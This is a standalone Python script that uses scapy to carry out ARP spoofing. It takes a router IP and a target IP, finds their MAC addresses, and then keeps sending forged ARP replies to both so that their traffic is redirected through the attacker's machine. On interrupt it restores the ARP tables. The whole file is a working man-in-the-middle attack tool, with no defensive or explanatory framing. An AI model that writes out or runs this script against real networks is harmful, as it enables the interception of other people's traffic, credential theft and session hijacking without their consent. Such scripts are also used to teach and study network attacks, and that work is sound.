#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time
import sys   #Only in python 2

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--router", dest="router", help="IP of router or access point")
    parser.add_argument("-t", "--target", dest="target", help="IP of target machine")
    options = parser.parse_args()
    if not options.router:
        parser.error("[-]Please specify ip of the router or access point")
    elif not options.target:
        parser.error("[-]Please specify ip of target machine")
    return options



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=8, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc

def spoof(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, count=4, verbose=False)
    
def restore(source_ip, source_mac, destination_ip, destination_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_argument()
print("[+] Finding router mac")
router_mac = get_mac(options.router)
print("[+] Finding target mac\n")
target_mac = get_mac(options.target)
sent_packets_count = 0
Flag = False
if target_mac and router_mac:
    Flag = True
else:
    Flag = False
    print("[-] Unable to find associated mac addresses, please make sure target is up.")
try:
    while Flag:
        spoof(options.target, target_mac, options.router)
        spoof(options.router, router_mac, options.target)
        sent_packets_count = sent_packets_count + 2
        #Python 2
        print("\r[+] Packets sent: " + str(sent_packets_count*4)),
        sys.stdout.flush()
        #Python 3
        #print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(0.5)
except KeyboardInterrupt:
    print("\n[*] Detected CTRL + C ....... Resetting ARP tables, please wait..")
    restore(options.target, target_mac, options.router, router_mac)
    restore(options.router, router_mac, options.target, target_mac)
    print("\n[+] Reset complete - Quitting.")